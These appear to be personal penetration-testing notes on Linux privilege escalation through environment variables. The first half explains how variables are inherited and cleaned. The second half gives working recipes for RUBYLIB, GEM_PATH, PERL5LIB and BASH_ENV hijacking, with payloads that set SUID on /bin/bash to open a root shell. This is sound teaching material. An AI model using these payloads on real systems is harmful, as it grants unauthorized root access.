---
created: 26-01-2026
tags:
  - Linux_PrivEsc
---
## The danger of environment variables

Environment variables control how processes behave at runtime — they define execution flow, specify where to load binaries and libraries, and dictate how interpreters find modules. When a privileged process trusts user-controlled environment variables, you can often hijack its logic to escalate privileges. This is **environment variable hijacking**.
### Attack surface

>[!note] Some of the attacks with environment variables are already covered in other articles — I just leave links to those. This article covers the rest.

- Shared library hijacking (see [[shared_library_hijacking]]):
	- `LD_PRELOAD` — Force-load libraries before all others ([[shared_library_hijacking#`LD_PRELOAD`]])
	- `LD_LIBRARY_PATH` — Control library search path ([[shared_library_hijacking#`LD_LIBRARY_PATH`]])
- Dependency hijacking (language-specific):
	- `PYTHONPATH` — Python module search path (see [[_Python_library_hijacking]])
	- `RUBYLIB` — Ruby library search paths ([[#`RUBYLIB`]] section)
	- `GEM_PATH` — Ruby gem locations ([[#`GEM_PATH`]] section)
	- `PERLLIB` and `PERL5LIB` — Perl library search paths ([[#`PERLLIB` and `PERL5LIB`]] section)
	- `NODE_PATH` — Node.js module resolution
	- `CLASSPATH` — Java class loading
- Execution control:
	- `PATH` — Binary search order (see [[PATH_hijacking]])
	- `IFS` — Shell word splitting (can break command parsing)

>[!important]+ Custom variables 
>Beyond the well-known variables (`LD_PRELOAD`, `PYTHONPATH`, etc.), custom applications often define their own environment variables for configuration. These can provide privilege escalation paths if the application runs with elevated privileges.
>Though exploitation depends on how these variables are used and whether you can control them in each particular case.
## On Linux environment variables
### Where environment variables come from 

Before we dive into exploitation — below is an explanation on where variables come from in different context, how they're propagated and when they're reset.

>[!note] A similar topic is discussed in [[PATH_hijacking#Where `PATH` comes from]], but this time the description will be more generic to all variables than just `PATH`.

#### Variable inheritance

At the kernel level, environment variables are null-terminated strings stored in a process's memory space, specifically within the `environ` array. 

Environment variables are inherited from parent to child processes. When a process spawns a child:
1. The parent calls `fork()` and creates a child process that receives an exact **copy** of the parent memory space, including all environment variables. 
2. The child can then replace itself with a new program via `execve()`. By default, the new program inherits the parent's environment through the `envp` argument.

>[!important] Only **exported** variables are passed from parent to child processes (`export ...`). Local variables are dropped.
>```bash
># local variable - won't propagate
>NAME="value"
>
># exported variable - will propagate
>export NAME="value" 
>```

>[!note] Child changes to `env` don't affect parent (independent copies).

>[!important] A program can explicitly choose to ignore the inherited environment and start fresh (e.g., using `env -i` or `execle` with a `NULL` environment). This is exactly what `sudo` and some hardened SUID binaries do for security reasons.

#### System boot and init

During boot, the kernel starts the init system (usually systemd or legacy SysV Init) — PID `1` — with a minimal hardcoded environment. The kernel itself doesn't set variables like `PATH` — the init process does.

- The **`systemctl show-environment`** command displays the environment variables currently set in the systemd manager's environment. These are available globally to all systemd units:

```bash
systemctl show-environment
```

```bash
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
```

##### System vs user service environments

>[!important]+ `PATH` for system services and user services (`--user`) will be different.
>- When the system boots, systemd establishes a global environment for system services, including `PATH`:
> 
> ```bash
> systemctl show-environment | grep PATH
> PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
> ```
> - When you log in, a separate instance of systemd (`systemd --user`) is started for your session. It may merge additional paths (like Perl or Ruby binary paths) into `PATH`:
> ```bash
> systemctl --user show-environment | grep PATH
>PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl
> ```

#### The login process

- When you authenticate via a TTY, SSH, or serial console, the [`login`](https://man.archlinux.org/man/login.1.en) program is invoked.
- `login` sets UID and GID, and some environment variables like `HOME`, `USER`, `SHELL`, `PATH`, `LOGNAME`, `MAIL`, based on `/etc/login.defs` and the corresponding user's entry in `/etc/passwd`.

The default `PATH` value is set to `ENV_PATH` for regular users and `ENV_SUPATH` for root in `/etc/login.defs` (varies by distribution):

```bash
cat /etc/login.defs | grep PATH
```

```bash
# *REQUIRED*  The default PATH settings, for superuser and normal users.
ENV_SUPATH	PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
ENV_PATH	PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
```

These values are inherited by the shell you start (e.g., `bash`) and form the basis of your `PATH`.

>[!important] `login` sets a **default `PATH`** _before_ any shell startup file runs.

#### Shell invocation

Your shell's behavior determines which configuration files it sources, which in turn affects your environment. Bash distinguishes between three shell types:

- **Interactive login shells** — triggered by SSH sessions, console logins, `su - username`, `bash --login` or `bash -l`, and display/login managers (`sddm`, `gdm`):
	1. `/etc/profile` (sources `/etc/profile.d/*.sh` and `/etc/bash.bashrc`).
	2. `~/.bash_profile` (per-user profile; often sources `~/.bashrc`).
	3. `~/.bash_login`
	4. `~/.profile`

- **Interactive non-login shells** — triggered by opening terminal emulator in GUI, running `bash` from existing shell, subshells in interactive scripts:
	1. `/etc/bash.bashrc`
	2. `~/.bashrc` (skipped if `--norc` is set).

>[!note] Non-login shells typically inherit `PATH` from their parent rather than rebuilding it from scratch.

- **Non-interactive shells** — triggered by script invocation in shells (`bash script.sh`), scripts with shebang `#!/bin/bash`, SSH remove commands (`ssh user@host 'command'`):
	- Looks for the variable `BASH_ENV` in the environment and expands its value if it's set; then uses the expanded value as the name of a file to read and execute.

>[!important] Non-interactive shells do not source profile files automatically; they inherit the environment from parent process.

>[!note] See [[shells]].

>[!warning] Non-interactive shells (Cron, systemd) **do not read** `.bashrc` and `.profile`; instead, they rely on **hardcoded defaults** and **explicit `PATH=` assignments**.

#### Cron jobs

Cron jobs run with a minimal environment. Custom variables must be set explicitly in the crontab.

>[!example]+
> ```bash
> cat /etc/crontab
> ```
> ```bash
> # ... 
> 
> SHELL=/bin/sh
> PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
> 
> # m h dom mon dow user  command
> 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
> 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
> 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
> 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
> ```

#### Systemd services

Beyond systemd defaults, services can define environment variables via `Environment=` or `EnvironmentFile=` in their unit files.

- Check a service environment:

```bash
systemctl show <service-name> --property=Environment
```

>[!example]+
> ```bash
> systemctl show ollama.service --property=Environment
> ```
> 
> ```bash
> Environment="PATH=\$PATH"
> ```

#### `sudo`

By default, `sudo` **resets the environment** to a minimal set of variables. This behavior is controlled by the `env_reset` directive in `/etc/sudoers` and is set by default. 

- The `PATH` variable is explicitly set to `secure_path`:

```bash
sudo grep secure_path /etc/sudoers
```
```bash
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/bin"
```

>[!important] `secure_path` only affects `sudo`. It does not affect SUID binaries, Cron jobs, or systemd services.

- `sudo` can be configured to preserve specific environment variables using the `env_keep` directive:

```bash
sudo grep env_keep /etc/sudoers
```

```bash
Defaults!/usr/bin/visudo env_keep += "SUDO_EDITOR EDITOR VISUAL"
```

The above line configures `sudo` to inherit variables `SUDO_EDITOR`, `EDITOR`, and `VISUAL` from the environment of the user who runs `sudo`.

### Environment sanitation in SUID/SGID binaries

When a SUID or SGID binary is executed, Linux marks the process as running in *secure-execution mode* by setting the `AT_SECURE` flag in [auxiliary vector]([https://refspecs.linuxfoundation.org/LSB_1.3.0/IA64/spec/auxiliaryvector.html](https://lwn.net/Articles/519085/)) to `1`.  

When the dynamic loader (`ld.so`) loads a binary with `AT_SECURE` set to a non-zero value, it **sanitizes environment variables that could affect dynamic linking**.

In secure-execution mode, `ld.so` disables or ignores these variables:
- `LD_PRELOAD`
- `LD_LIBRARY_PATH`
- `LD_AUDIT`
- `LD_DEBUG`/`LD_DEBUG_OUTPUT`
- `LD_ORIGIN_PATH`
- `LD_DYNAMIC_WEAK`
- `LD_PROFILE`, `LD_SHOW_AUXV`

This is why [[shared_library_hijacking|shared library hijacking]] via `LD_PRELOAD` or `LD_LIBRARY_PATH` doesn't work.

The loader, however, **does not** automatically sanitize variables like `PATH`, `HOME`, `PYTHONPATH`, and others.

>[!note]  See [[SUID_&_SGID_privilege_escalation#Environment variables and secure-execution mode]] for more detail.

### What gets sanitized (and what does not)

In secure-execution mode, `ld.so` disables or ignores variables such as:

- `LD_PRELOAD`
- `LD_LIBRARY_PATH`
- `LD_AUDIT`
- `LD_DEBUG` / `LD_DEBUG_OUTPUT`
- `LD_ORIGIN_PATH`
- `LD_DYNAMIC_WEAK`
- `LD_PROFILE`, `LD_SHOW_AUXV`, and others

These variables are commonly used for **shared library injection**, which is why such attacks usually fail against SUID/SGID binaries.

Crucially, **this sanitation only applies to variables the dynamic loader understands**.

The kernel and the loader do *not* automatically sanitize:
- `PATH`
- `HOME`
- `IFS`
- `TMPDIR` (when used by the application itself)
- Custom application-defined variables

If a SUID/SGID program explicitly reads environment variables (e.g. via `getenv()` or indirectly through `system()`), those variables may still be attacker-controlled.

- Loader-level variables → usually blocked in SUID/SGID
- Application-level variables → often still exploitable
- Protection is about **dynamic linking**, not program logic

This explains why `PATH` hijacking and custom environment-variable abuse may still succeed, while `LD_PRELOAD`-style attacks typically do not.

## `RUBYLIB`: Ruby library hijacking

### How Ruby loads code

When a Ruby script loads external code via `require`, `require_relative`, or `load` without specifying its full path, Ruby searches through directories listed in the global `$LOAD_PATH` array (also aliased as `$:`). Ruby uses **the first matching file** it finds (`.rb`, `.so`, `.bundle`, etc.) and records it in `$LOADED_FEATURES` to prevent double-loading.

- Inspect the current `$LOAD_PATH`:

```bash
ruby -e 'puts $LOAD_PATH'
```

```bash
ruby -e 'puts $:'
```

>[!example]+
> ```bash
> ruby -e 'puts $LOAD_PATH'
> ```
> ```bash
> /usr/lib/ruby/site_ruby/3.4.0
> /usr/lib/ruby/site_ruby/3.4.0/x86_64-linux
> /usr/lib/ruby/site_ruby
> /usr/lib/ruby/vendor_ruby/3.4.0
> /usr/lib/ruby/vendor_ruby/3.4.0/x86_64-linux
> /usr/lib/ruby/vendor_ruby
> /usr/lib/ruby/3.4.0
> /usr/lib/ruby/3.4.0/x86_64-linux
> ```


`$LOAD_PATH` is built from several sources, in order or priority:
1. Paths provided with the `-I` command-line option.
2. **The `RUBYLIB` environment variable.**
3. RubyGems paths (`GEM_PATH`).
4. Standard library paths compiled into Ruby.
5. Site/vendor paths.

>[!note] `$LOAD_PATH` is a Ruby runtime variable. It's not loaded from the environment but built from different components. So, no, it can't be set directly. 
### The `RUBYLIB` environment variable

- `RUBYLIB` contains a colon-separated list of directories where Ruby searches for code. When Ruby starts, it automatically prepends these directories to `$LOAD_PATH`:

```bash
export RUBYLIB=/tmp/lib:/opt/test
```

> [!important] `RUBYLIB` is prepended to `$LOAD_PATH`, meaning anything in `RUBYLIB` gets searched before system directories.

> [!example]+
> ```bash
> RUBYLIB=/tmp/lib:/opt/test ruby -e 'puts $LOAD_PATH'
> ```
> 
> ```bash
> /tmp/lib
> /opt/test
> /usr/lib/ruby/site_ruby/3.4.0
> /usr/lib/ruby/site_ruby/3.4.0/x86_64-linux
> /usr/lib/ruby/site_ruby
> /usr/lib/ruby/vendor_ruby/3.4.0
> /usr/lib/ruby/vendor_ruby/3.4.0/x86_64-linux
> /usr/lib/ruby/vendor_ruby
> /usr/lib/ruby/3.4.0
> /usr/lib/ruby/3.4.0/x86_64-linux
> ```

This means if a Ruby script imports:

```ruby
require 'net/http'
```

Ruby checks `/tmp/lib/net/http.rb` and `/opt/test/net/http.rb` **before** checking the real system library path at `/usr/lib/ruby/3.4.0/net/http.rb`.

### The `RUBYLIB` hijacking attack

> [!bug] If you find a Ruby script that imports code using relative paths and you control `RUBYLIB` or any directory in `$LOAD_PATH`, you can hijack that import.

The principle is similar to other dependency hijacking attacks: you trick the interpreter into loading your code instead of what was originally intended.

For this to work for privilege escalation, you need a privileged execution context. The vulnerable Ruby script can be, for example:
- A SUID/SGID script (rare but possible).
- A script you can execute with `sudo` with the `RUBYLIB` environment variable preserved (`env_keep+=RUBYLIB`).
- A script executed by a privileged Cron job where you control `RUBYLIB` or any directories it specifies.
- A systemd service that executes a Ruby script and uses a writable `EnvironmentFile=`.

So, suppose you find a Ruby script you can execute with root `sudo`:

```bash
sudo -l
```
```bash
(root) NOPASSWD: /usr/bin/ruby /usr/local/bin/backup.rb
```

The script contains:

```ruby
require 'fileutils'
FileUtils.rm_rf('/tmp/old_backups')
# ...
```

Normally, this loads `/usr/lib/ruby/3.4.0/fileutils.rb`. But if `RUBYLIB` is preserved, you can hijack it.

```bash
Defaults!/usr/bin/ruby env_keep += "RUBYLIB"
```

1. Find the original module location. You need to know where the real module lives so you can import it in your script to avoid errors during execution:

```bash
ruby -e "puts $LOAD_PATH.map {|p| Dir.glob('#{p}/fileutils.rb')}.flatten"
```
```bash
...
/usr/lib/ruby/3.4.0/fileutils.rb
```

2. Create a custom script with the same name as the import (e.g., `fileutils.rb`) in a directory you control:

```bash
cat > /tmp/ruby_exploit/fileutils.rb << 'EOF'
# load the original module to avoid errors in the target script
require '/usr/lib/ruby/3.4.0/fileutils.rb'

# payload
system("chmod u+s /bin/bash")
EOF
```

Thanks to `require '/usr/lib/ruby/3.4.0/fileutils.rb'`, when the target script calls `FileUtils.rm_rf()`, the function works as expected. 

3. Execute the target script with `RUBYLIB` set to the directory with your code:

```bash
sudo RUBYLIB=/tmp/ruby_exploit ruby /usr/local/bin/backup.rb
```

4. Spawn a root shell:

```bash
/bin/bash -p
```

>[!note]+ In you don't care about the script completing successfully:
> 
> ```bash
> cat > /tmp/ruby_exploit/fileutils.rb << 'EOF'
> exec("/bin/bash -p")
> EOF
> ```

>[!note]+ Even if `RUBYLIB` isn’t preserved, sometimes scripts use:
> 
> ```ruby
> require_relative './helper'
> require_relative 'config/settings'
> ```
> 
> You just `cd` to a directory you control, create `helper.rb`, and execute the script from there.
> ```bash
> mkdir -p /tmp/exploit/config
> cat > /tmp/exploit/helper.rb << 'EOF'
> system("chmod u+s /bin/bash")
> EOF
> 
> cat > /tmp/exploit/config/settings.rb << 'EOF'
> system("chmod u+s /bin/bash")
> EOF
> ```
> Execute:
> ```bash
> cd /tmp/exploit
> sudo ruby /path/to/vulnerable_script.rb
> ```
>> [!warning] This only works if the script doesn't use `Dir.chdir()` to change to a specific directory before loading relative modules.

>[!warning] This won't work if the script uses full path.

>[!warning] If the script imports code using absolute paths, hijacking won't work. Only relative imports are vulnerable.
>```ruby
>require '/usr/lib/ruby/3.4.0/fileutils'
>```

## `GEM_PATH`: Ruby Gem hijacking

### Ruby gems

>A **[gem](https://guides.rubygems.org/what-is-a-gem/)** in Ruby is a self-container package of Ruby code, documentation, and metadata that provides reusable functionality for Ruby applications.

- Gems are managed by the **[RubyGems](https://rubygems.org/)** and are typically installed via:

```bsah
gem install gem_name
```

- When a script requires a gem without specifying its full path (e..g, `require 'rails'`Ruby searches for the gem in directories specified in the `GEM_PATH` environment variable.

### How `GEM_PATH` works

- `GEM_PATH` is similar to `RUBYLIB`, but it specifies where Ruby looks for **installed gems**, not standard library files. RubyGems uses `GEM_PATH` to build parts of `$LOAD_PATH`, but gem directories appear **after** `RUBYLIB` entries and **before** some system paths.
- RubyGems uses `GEM_PATH` to build parts of `$LOAD_PATH`, but **gem directories appear after `RUBYLIB` entries** and **before some system paths**.

- To view RubyGems environment, including `GEM_PATH`:

```bash
gem env
```

>[!example]+
> ```bash
> gem env
> ```
> ```bash
> RubyGems Environment:
>   - RUBYGEMS VERSION: 3.3.15
>   - RUBY VERSION: 3.1.2 (2022-04-12 patchlevel 20) [x86_64-linux-gnu]
>   - INSTALLATION DIRECTORY: /var/lib/gems/3.1.0
> # ...
>   - GEM PATHS:
>      - /var/lib/gems/3.1.0
>      - /home/user/.local/share/gem/ruby/3.1.0
>      - /usr/local/lib/ruby/gems/3.1.0
>      - /usr/lib/ruby/gems/3.1.0
>      - /usr/lib/x86_64-linux-gnu/ruby/gems/3.1.0
>      - /usr/share/rubygems-integration/3.1.0
>      - /usr/share/rubygems-integration/all
>      - /usr/lib/x86_64-linux-gnu/rubygems-integration/3.1.0
> # ...
> ```

### The `GEM_PATH` hijacking attack

> [!bug] If you find a Ruby script that imports gems using relative paths and you control `GEM_PATH` or any directory it specifies, you can hijack that import.

- `GEM_PATH` hijacking is less common that `RUBYLIB` hijacking because most production scripts use system-installed gems in protected directories. But it still happens.

For example, you find a Ruby script you can execute with `sudo`. 

```bash
sudo -l
```
```bash
(root) NOPASSWD: /usr/bin/ruby /usr/local/bin/backup.rb
```

This time, the `RUBYLIB` variable is not preserved in `sudo` environment, but `GEM_PATH` is:

```bash
Defaults!/usr/bin/ruby env_keep += "GEM_PATH"
```

The script requires:

```ruby 
require 'json'
```

1. In your controlled directory, create:

```bash
mkdir -p /tmp/gems/gems/json-9.9.9/lib
```

2. Inside that directory, create a script with the same name as the target gem (e.g., `json.rb`):

```bash
cat /tmp/gems/gems/json-9.9.9/lib/json.rb << 'EOF'
system("chmod +s /bin/bash")
EOF
```

>[!note] RubyGems expects a `.gemspec` file, but for simple hijacking, you can often skip this if the script only uses `require` (not `gem` commands).

3. Set `GEM_PATH` and execute:

```bash
sudo GEM_PATH=/tmp/gems:/usr/lib/ruby/gems/3.4.0 /usr/bin/ruby /usr/local/bin/backup.rb
```

Ruby searches `/tmp/gems` first, finds your fake gem, loads it, and executes your payload.

4. Spawn a root shell:

```bash
/bin/bash -p
```


>[!warning] Unlike `LD_PRELOAD` or `PYTHONPATH`, `GEM_PATH` is almost never in `env_keep` configurations.
## `PERLLIB` and `PERL5LIB`: Perl module hijacking

### How Perl loads modules

Perl loads external libraries, called **modules**, via `use` (most common) or `require`:

```perl
use ModuleName;
```

```perl 
require ModuleName;
```

For modules imported without absolute paths, Perl searches in directories specified in the `@INC` array (equivalent to Ruby's `$LOAD_PATH` or Python's `sys.path`).

- Inspect `@INC`:

```bash
perl -e 'print join("\n", @INC)'
```

> [!example]+
> ```bash
> perl -e 'print join("\n", @INC)'
> ```
> 
> ```bash
> /usr/lib/perl5/5.42/site_perl
> /usr/share/perl5/site_perl
> /usr/lib/perl5/5.42/vendor_perl
> /usr/share/perl5/vendor_perl
> /usr/lib/perl5/5.42/core_perl
> /usr/share/perl5/core_perl
> ```

- When Perl sees:

```perl
use File::Copy;
```

It translates that to:

```perl
File/Copy.pm
```

The `::` becomes `/`, and `.pm` (Perl Module) is appended. Perl then searches each directory in `@INC` for `File/Copy.pm`. For example, if `@INC` contains `/usr/lib/perl5` and `/tmp/mylibs`, Perl will check `/usr/lib/perl5/File/Copy.pm` and `/tmp/mylibs/File/Copy.pm`. The first match wins.
### `PERLLIB`/`PERL5LIB` hijacking

Both `PERLLIB` and `PERL5LIB` modify `@INC`. They're functionally identical — `PERL5LIB` is the more modern variable, but both are supported for backwards compatibility. These variables are **prepended to `@INC`**, meaning they're searched before standard library directories.

>[!bug] If you control either `PERLLIB` or `PERL5LIB` (or any directories inside) for a privileged Perl script that requires modules without specifying their full paths, you can hijack that module.

Suppose you can execute a Perl script at `/usr/local/bin/backup.pl` with `sudo`, and it contains:

```perl
use File::Copy;
copy('/source/file', '/dest/file');
# ...
```

`sudo` preserves `PERL5LIB`:

```bash
sudo -l
```
```bash
# ...
env_keep+=PERL5LIB 
(root) NOPASSWD: /usr/bin/perl /usr/local/bin/backup.pl
```

1. In the directory you control, create a custom module directory structure:

```bash
mkdir -p /tmp/perl_exploit/File
```

2. Inside the module, create a `.pm` script:

```bash
cat > /tmp/perl_exploit/File/Copy.pm << 'EOF'
package File::Copy;

system("chmod u+s /bin/bash");

# required: Perl modules must return true
1;
EOF
```

>[!note] **`package File::Copy;`**: Declares the module namespace to match what the script expects.

3. Execute the target script with `PERL5LIB` set:

```bash
sudo PERL5LIB=/tmp/perl_exploit perl /usr/local/bin/backup.pl
```

Perl searches `/tmp/perl_exploit/File/Copy.pm` first, loads it, executes your payload, and the script fails because you didn't implement the real `copy()` function. But you don't care — `/bin/bash` is now SUID.

4. Spawn a root shell:

```bash
/bin/bash -p
```

>[!warning] Some systems only honor `PERL5LIB`, others only `PERLLIB`. If one doesn't work, try the other.

>[!important] When you will actually encounter Perl?
> Perl is less common in modern environments (as of 2026), but you'll find it in:
> - Legacy enterprise systems (especially Debian/Ubuntu servers from 2000s-2010s).
> - Network devices managements scripts (routers, switches, and other network appliances often use Perl for automation).
> - `cfengine`, some Puppet modules, legacy Chef recipes.

## `BASH_ENV`

When Bash runs in non-interactive mode (script execution, SSH remote commands), it doesn't source `.bashrc` or `.profile`. Instead, it checks for the `BASH_ENV` variable, expands its value, and executes that file before running the script.

This can be exploited for privilege escalation when:
- A script runs as root uses `#!/bin/bash` (non-interactive context).
- You can control the `BASH_ENV` variable when the script is invoked.
- The script doesn't explicitly sanitize its environment.

If you find such a script:

1. Create a payload:

```bash
cat > /tmp/bash_payload.sh << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF

chmod +x /tmp/bash_payload.sh
```

2. Execute the target script:

```bash
BASH_ENV=/tmp/bash_payload.sh /path/to/privileged_script.sh
```

If the script runs as root, your payload executes before the script's main logic. That's it.

## References and further reading

- [`Ruby Load Path — LOSHUA PALING`](https://joshuapaling.com/blog/2015/03/22/ruby-load-path.html)
